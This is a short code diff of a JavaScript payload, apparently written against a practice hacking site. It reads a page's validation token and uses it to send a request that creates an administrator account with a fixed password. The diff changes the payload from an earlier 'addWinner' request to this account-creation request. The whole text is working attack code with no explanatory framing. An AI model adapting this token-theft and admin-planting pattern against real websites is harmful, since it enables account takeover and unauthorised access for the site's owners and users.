@@ -12,7 +12,7 @@ console.log("2." + validatingUuid);
 if(validatingUuid){
 var validatingUuidValue = $("[name='validatingUuid']")[0].value;
 //console.log("3." + validatingUuidValue);
-req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
+req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/page/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
 //console.log("4." + req.responseText);
 }
